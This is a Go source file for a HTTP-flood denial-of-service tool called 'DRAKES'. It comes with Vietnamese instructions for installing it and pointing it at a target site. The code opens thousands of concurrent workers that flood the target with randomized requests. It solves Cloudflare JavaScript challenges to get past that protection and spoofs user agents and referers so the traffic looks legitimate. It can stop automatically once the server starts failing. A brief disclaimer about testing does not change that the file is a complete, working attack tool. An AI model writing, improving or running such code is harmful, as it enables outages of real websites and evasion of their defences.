package main

/*
hướng dẫn
B1. Cài đặt Golang bằng cách truy cập vào đường link như sau: https://go.dev/dl/
B2. Cài đặt Node.js (cần thiết cho go-cfscrape giải challenge JavaScript của Cloudflare) trên Ubuntu. Đảm bảo node và npm nằm trong biến môi trường PATH.
B3. Mở Terminal/Command Prompt trong thư mục chứa file này.
B4. Khởi tạo Go Module nếu chưa có: go mod init your_module_name
B5. Tải thư viện go-cfscrape: go get github.com/iain17/go-cfscrape
B6. Chạy chương trình: go run edit.go --site Đường Link Cần DDos
ví dụ: go run edit.go --site https://abc.abc
vì chạy bằng golang nên hiệu suất khá cao
Lưu ý: Script này có mục đích thử nghiệm và học hỏi. Việc tấn công từ chối dịch vụ (DDoS) vào các hệ thống mà bạn không có quyền là bất hợp pháp.
--- Chúc Bạn Thành Công ---
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time" // Import time cho timeout của client

	cfscrape "github.com/iain17/go-cfscrape" // Import thư viện go-cfscrape
)

const __version__ = "1.0.3" // Cập nhật phiên bản

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk uint8 = iota
	callExitOnErr // Tín hiệu này vẫn được dùng để đếm lỗi, nhưng không giảm cur
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
		"https://fuoverflow.com/search/493145/?q=",
		"https://sextop1.bar/search/",
		"https://javhdz.love/search/",
		"https://voz.vn/search/1726933/?q=",
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
	}
	cur int32 // Số lượng goroutine httpcall đang chạy
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("DRAKESMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 8192 // TỐC ĐỘ 512, 1024, 2048, 4096 //chọn tốc độ ở đây
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("DRAKES", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- DRAKES Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8) // Channel để nhận tín hiệu từ các goroutine con
		var (
			errCount, sentCount int32 // Đổi tên biến để tránh trùng lặp với err trong hàm httpcall
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			// Kiểm tra số lượng goroutine đang chạy trước khi tạo cái mới
			if atomic.LoadInt32(&cur) < int32(maxproc) { // So sánh với maxproc, không phải maxproc-1
				// Truyền các tham số cần thiết vào goroutine
				go httpcall(site, u.Host, data, headers, ss)
			} else {
				// Nếu đạt giới hạn, chờ một chút trước khi kiểm tra lại
				time.Sleep(time.Millisecond * 10)
			}

			// Nhận tín hiệu từ channel
			select {
			case signalVal := <-ss:
				switch signalVal {
				case callExitOnErr:
					// errCount++ // Lỗi này đã được đếm trong httpcall
					// Không giảm cur ở đây nữa, việc giảm được xử lý bằng defer trong httpcall
					errCount++ // Vẫn tăng biến đếm lỗi hiển thị
				case callExitOnTooManyFiles:
					// Không giảm cur ở đây nữa
					maxproc-- // Giảm số lượng goroutine tối đa nếu gặp lỗi too many files
					errCount++ // Coi đây là một loại lỗi
				case callGotOk:
					sentCount++
				case targetComplete:
					sentCount++
					// Không giảm cur ở đây nữa
					fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", atomic.LoadInt32(&cur), maxproc, sentCount, errCount) // Sử dụng atomic.LoadInt32 để đọc cur
					fmt.Println("\r-- DRAKES Attack Finished --       \n\n\r")
					os.Exit(0)
				}
			case <-time.After(time.Millisecond * 100):
				// Timeout để cập nhật hiển thị ngay cả khi không có tín hiệu mới
			}


			// Cập nhật hiển thị sau khi xử lý tín hiệu hoặc sau timeout
			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", atomic.LoadInt32(&cur), maxproc, sentCount, errCount) // Sử dụng atomic.LoadInt32 để đọc cur

		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1) // Tăng bộ đếm goroutine đang chạy khi bắt đầu
	defer atomic.AddInt32(&cur, -1) // Đảm bảo giảm bộ đếm khi goroutine kết thúc (return)

	// --- Bắt đầu phần tích hợp go-cfscrape ---
	// Tạo một RoundTripper từ go-cfscrape
	// RoundTripper này sẽ tự động xử lý thử thách Cloudflare
	// Cần có một JavaScript runtime (như Node.js) để go-cfscrape hoạt động với executor mặc định
	// Nếu gặp vấn đề với Node.js trên Ubuntu, bạn có thể thử cấu hình executor cụ thể hơn ở đây
	transport := cfscrape.NewRoundTripper(nil) // nil để dùng cấu hình mặc định

	// Tạo một http.Client sử dụng RoundTripper này
	// Đặt timeout cho client để tránh request bị treo quá lâu
	client := &http.Client{
		Timeout:   time.Second * 45, // Tăng timeout một chút để cho phép Cloudflare challenge và mạng chậm trên server
		Transport: transport,        // Gán RoundTripper của go-cfscrape
		// CookieJar sẽ được quản lý bởi RoundTripper của go-cfscrape
	}
	// --- Kết thúc phần tích hợp go-cfscrape ---


	var param_joiner string

	if strings.ContainsRune(requestURL, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for { // Vòng lặp vô hạn để liên tục gửi request trong goroutine này
		var q *http.Request
		var err error

		// Nếu không có data, thực hiện GET request với tham số ngẫu nhiên
		if data == "" {
			fullURL := requestURL + param_joiner + buildblock(rand.Intn(7)+3) + "=" + buildblock(rand.Intn(7)+3)
			q, err = http.NewRequest("GET", fullURL, nil)
		} else { // Nếu có data, thực hiện POST request
			q, err = http.NewRequest("POST", requestURL, strings.NewReader(data))
		}

		if err != nil {
			// fmt.Fprintln(os.Stderr, "Error creating request:", err) // Bỏ comment để debug
			s <- callExitOnErr // Báo cáo lỗi
			// Không return ở đây để vòng lặp for tiếp tục thử request khác
			continue
		}

		// Đặt các Header. go-cfscrape có thể tự đặt một số header,
		// nhưng việc đặt thủ công User-Agent và Referer có thể giúp request trông thật hơn.
		// Các header khác như Cache-Control, Keep-Alive, Connection, Host có thể giữ lại.
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		//  q.Header.Set("Authorization", "Basic Njk2OTY5OjY5Njk2OQ==") // Nếu cần xác thực
		q.Header.Set("Accept-Charset", acceptCharset)
		// Đảm bảo Referer là một URL hợp lệ và có vẻ tự nhiên
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Ghi đè các header bằng tham số dòng lệnh nếu có
		for _, element := range headers {
			words := strings.SplitN(element, ":", 2) // Sử dụng SplitN để xử lý header value có chứa ":"
			if len(words) == 2 {
				q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
			} else {
				fmt.Fprintf(os.Stderr, "Warning: Invalid header format '%s'. Expected 'Name: Value'.\n", element)
			}
		}

		// Thực hiện request bằng client đã tích hợp go-cfscrape
		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, "Error performing request:", e.Error()) // Bỏ comment để debug lỗi chi tiết trên Ubuntu
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles // Báo cáo lỗi too many files
				return // Thoát goroutine nếu gặp lỗi too many files
			}
			s <- callExitOnErr // Báo cáo lỗi chung
			// Không return ở đây để vòng lặp for tiếp tục thử request khác
			time.Sleep(time.Second) // Thêm khoảng dừng sau lỗi để tránh spam và cho hệ thống phục hồi
			continue
		}

		// Đóng Body để giải phóng tài nguyên
		// Đọc hết body để chắc chắn kết nối được tái sử dụng (keep-alive)
		_, readErr := ioutil.ReadAll(r.Body)
		if readErr != nil {
			// fmt.Fprintln(os.Stderr, "Error reading response body:", readErr) // Bỏ comment để debug
			// Không coi đây là lỗi nghiêm trọng làm dừng goroutine
		}
		r.Body.Close()

		// Kiểm tra mã trạng thái HTTP
		if r.StatusCode >= 200 && r.StatusCode < 300 { // Mã 2xx là thành công
			s <- callGotOk // Báo cáo thành công
		} else if r.StatusCode >= 500 { // Lỗi server (5xx)
			// fmt.Fprintf(os.Stderr, "Received server error status: %d\n", r.StatusCode) // Bỏ comment để debug
			s <- callGotOk // Vẫn coi là request đã đến đích thành công về mặt gửi đi
			if safe {
				s <- targetComplete // Nếu ở chế độ safe, dừng lại
				return // Thoát goroutine
			}
			time.Sleep(time.Millisecond * 500) // Dừng một chút sau lỗi 5xx
		} else {
			// Các mã trạng thái khác (ví dụ: 403 Forbidden, 404 Not Found, 429 Too Many Requests)
			// fmt.Fprintf(os.Stderr, "Received non-success status: %d\n", r.StatusCode) // Bỏ comment để debug
			s <- callExitOnErr // Coi là lỗi
			time.Sleep(time.Second) // Dừng một chút sau các lỗi khác
			// Không return ở đây để vòng lặp for tiếp tục thử request khác
			continue
		}

		// Có thể thêm một khoảng dừng nhỏ giữa các request thành công để giảm tải và trông thật hơn
		// time.Sleep(time.Millisecond * 50) // Ví dụ: dừng 50ms sau request thành công

	}
}

// Hàm buildblock giữ nguyên
func buildblock(size int) (s string) {
	var a []rune
	charSet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	for i := 0; i < size; i++ {
		a = append(a, rune(charSet[rand.Intn(len(charSet))]))
	}
	return string(a)
}
